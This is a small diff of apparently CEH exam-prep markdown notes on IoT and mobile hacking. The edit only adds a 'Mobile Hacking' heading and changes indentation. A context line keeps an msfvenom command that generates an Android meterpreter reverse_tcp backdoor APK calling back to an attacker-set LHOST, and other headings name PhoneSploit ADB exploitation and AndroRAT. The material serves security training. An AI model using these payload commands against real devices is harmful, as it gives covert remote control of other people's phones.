@@ -411,6 +411,7 @@ Program Tree->Headers double click
 * Analyze IOT device
 https://ceh-practical.cavementech.com/module-18.-iot-and-ot-hacking/2.-capture-and-analyze-iot-traffic
 
+#  Mobile Hacking
 <details>
 	<summary># Exploit the Android Platform through ADB using PhoneSploit</summary>
 	```console
@@ -463,8 +464,8 @@ https://ceh-practical.cavementech.com/module-18.-iot-and-ot-hacking/2.-capture-a
 	<summary># Hack an Android Device,Creating Binary Payloads</summary>
 	
 	```console
- [Linux]
-    sudo su
+ 	[Linux]
+    	sudo su
 	cd
 	service postgresql start
 	msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=[PIP] -R > Desktop/Backdoor.apk 
@@ -495,7 +496,6 @@ https://ceh-practical.cavementech.com/module-18.-iot-and-ot-hacking/2.-capture-a
  	```
 </details>
     
-
 <details>
 	<summary># Hack an Android Device,Creating APK File - AndroRAT</summary>
 	
